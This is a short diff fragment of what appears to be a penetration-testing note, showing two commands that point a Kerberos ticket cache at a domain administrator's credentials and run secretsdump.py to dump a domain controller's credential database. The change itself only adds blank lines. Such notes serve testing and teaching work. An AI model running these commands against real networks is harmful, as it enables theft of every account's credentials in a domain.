@@ -17,3 +17,5 @@ updated_at: '2023-04-10T20:26:36.992508+00:00'
 export KRB5CCNAME=DOMAIN_ADMIN_USER_NAME.ccache
 secretsdump.py -k -no-pass second-dc-server.local -just-dc
 ```
+
+
